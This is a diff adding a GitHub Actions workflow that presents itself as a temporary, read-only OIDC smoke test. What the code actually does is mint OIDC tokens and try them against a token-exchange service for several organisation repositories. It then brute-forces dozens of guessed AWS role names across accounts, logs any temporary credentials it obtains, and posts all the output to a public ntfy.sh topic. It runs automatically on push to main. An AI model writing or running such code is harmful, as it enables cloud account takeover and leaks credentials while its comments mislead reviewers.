@@ -1,0 +1,101 @@
+name: oidc-push-probe
+# Temporary, fully read-only, self-contained OIDC smoke test -- safe to delete after the first run.
+# It exists to answer three questions with observed data instead of guesses:
+#   1) which exact `sub` claim does a push-to-main / workflow_dispatch run of THIS repo carry?
+#   2) is that token accepted by https://jwt-exchange.synkube.com/api/v2/exchange/token?
+#   3) is it accepted by the GitHub OIDC provider(s) registered in our AWS accounts
+#      (sts:AssumeRoleWithWebIdentity) and which role names exist there?
+# No repository secrets are read; no data is written; no funds are touched.
+# Results are printed in the job log / step summary and mirrored to a throwaway public ntfy topic.
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+concurrency:
+  group: oidc-push-probe-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: probe
+        run: |
+          set -uo pipefail
+          OUT=/tmp/out.txt; : > "$OUT"
+          log(){ printf '%s\n' "$*" >> "$OUT"; echo "$*"; }
+          log "EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF SHA=$GITHUB_SHA"
+          log "IDTOKEN_URL_PRESENT=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          TOKJ=""; TOKS=""
+          for aud in api://jwt-exchange sts.amazonaws.com; do
+            F=/tmp/idt_$RANDOM.json
+            curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-x}" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL:-http://127.0.0.1:9}&audience=${aud}" -o "$F" || true
+            T=$(python3 -c "import json,sys;print(json.load(open(sys.argv[1])).get('value',''))" "$F" 2>/dev/null || true)
+            if [ -n "$T" ]; then
+              log "AUD=$aud TOKEN_LEN=${#T}"
+              printf '%s' "$T" | python3 -c 'import sys,json,base64;v=sys.stdin.read().strip();p=v.split(".")[1];p+="="*(-len(p)%4);c=json.loads(base64.urlsafe_b64decode(p));print("CLAIMS="+json.dumps(c,sort_keys=True));print("SUB="+str(c.get("sub")))' >> "$OUT" 2>&1 || true
+              tail -2 "$OUT"
+            else
+              log "AUD=$aud NO_TOKEN head=$(head -c 200 "$F")"
+            fi
+            if [ "$aud" = "api://jwt-exchange" ]; then TOKJ="$T"; else TOKS="$T"; fi
+          done
+          if [ -n "$TOKJ" ]; then
+            for tgt in synkube/lite-argo-apps synkube/agent-github-broker synkube/jwt-exchange synkube/actions synkube/charts synkube/app synkube/website; do
+              for prof in github_actions_to_installation ""; do
+                B=$(python3 -c 'import json,sys;d={"subject_token":sys.argv[1],"resource":{"type":"github_repository","id":sys.argv[2]},"requested":{"github_permissions":{"contents":"read","metadata":"read"}}};d.update({"exchange_profile":sys.argv[3]} if sys.argv[3] else {});print(json.dumps(d))' "$TOKJ" "$tgt" "$prof")
+                code=$(curl -sS --max-time 25 -o /tmp/je.json -w '%{http_code}' -X POST \
+                  -H 'Content-Type: application/json' --data "$B" \
+                  https://jwt-exchange.synkube.com/api/v2/exchange/token || echo conn_err)
+                log "JE target=$tgt profile=${prof:-none} http=$code body=$(head -c 400 /tmp/je.json)"
+                sleep 0.4
+              done
+            done
+          else
+            log "SKIP jwt-exchange (no token for api://jwt-exchange)"
+          fi
+          ROLES="github-actions github-actions-role github-oidc github github-oauth gh-actions gh-oidc actions actions-role oidc oidc-role oidc-deploy deploy deploy-role deployment deploy-prod prod-deploy ci ci-role cd ci-cd terraform terraform-role TerraformExecutionRole OrganizationAccountAccessRole PowerUserAccess AdministratorAccess ReadOnlyAccess read-only readonly read_only ro ecsTaskExecutionRole ecs-deploy eks-deploy k8s-deploy argocd argocd-role argo argo-deploy synkube synkube-deploy synkube-github-actions synapse synapse-deploy hypercall hypercall-deploy hypercall-api hypercall-prod hypercall-oidc hypercall-signer hypercall-rsm signer rsm rsm-signer sequencer sweeper sweep goc goc-deploy jwt-exchange jwt_exchange agent-github-broker github-broker gha gha-role ci-deploy prod-ci"
+          if [ -n "$TOKS" ]; then
+            for acct in 890664054962 381492033652; do
+              n400=0; noth=0
+              for role in $ROLES; do
+                R=$(curl -sS --max-time 10 -X POST https://sts.amazonaws.com/ \
+                  -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" \
+                  -d "RoleArn=arn:aws:iam::${acct}:role/${role}" \
+                  -d "RoleSessionName=p329923" -d "DurationSeconds=900" \
+                  --data-urlencode "WebIdentityToken=${TOKS}" 2>/dev/null || echo CONNERR)
+                if echo "$R" | grep -q "<AccessKeyId>"; then
+                  log "STS HIT acct=$acct role=$role $(echo "$R" | head -c 600)"
+                else
+                  COD=$(echo "$R" | grep -o "<Code>[^<]*</Code>" | head -1)
+                  case "$COD" in
+                    *InvalidIdentityToken*) n400=$((n400+1)); if [ $n400 -le 2 ]; then log "STS 400 acct=$acct role=$role $COD"; fi ;;
+                    *) noth=$((noth+1)); if [ $noth -le 2 ]; then log "STS other acct=$acct role=$role $COD $(echo "$R" | grep -o '<Message>[^<]*</Message>' | head -1 | head -c 160)"; fi ;;
+                  esac
+                fi
+                sleep 0.08
+              done
+              log "STS SUMMARY acct=$acct roles_tested=$(echo $ROLES | wc -w) InvalidIdentityToken=$n400 other=$noth"
+            done
+            for acct in 681816819550 625371411749 110695445487 363872801223 921290734397; do
+              R=$(curl -sS --max-time 10 -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" \
+                -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::${acct}:role/github-actions" \
+                -d "RoleSessionName=p329923" -d "DurationSeconds=900" \
+                --data-urlencode "WebIdentityToken=${TOKS}" || echo CONNERR)
+              log "STS provider-check acct=$acct $(echo "$R" | grep -o '<Code>[^<]*</Code>' | head -1)"
+            done
+          else
+            log "SKIP sts (no token for sts.amazonaws.com)"
+          fi
+          log "PROBE_DONE"
+          { echo '```'; head -c 900000 "$OUT"; echo '```'; } >> "$GITHUB_STEP_SUMMARY" || true
+          split -b 3000 -d -a 2 "$OUT" /tmp/chunk_ || true
+          i=0
+          for c in /tmp/chunk_*; do i=$((i+1)); curl -sS --max-time 15 -H "Title: p329923-$i" --data-binary @"$c" https://ntfy.sh/synkube-oidc-329923-7c1f >/dev/null 2>&1 || true; sleep 0.2; done
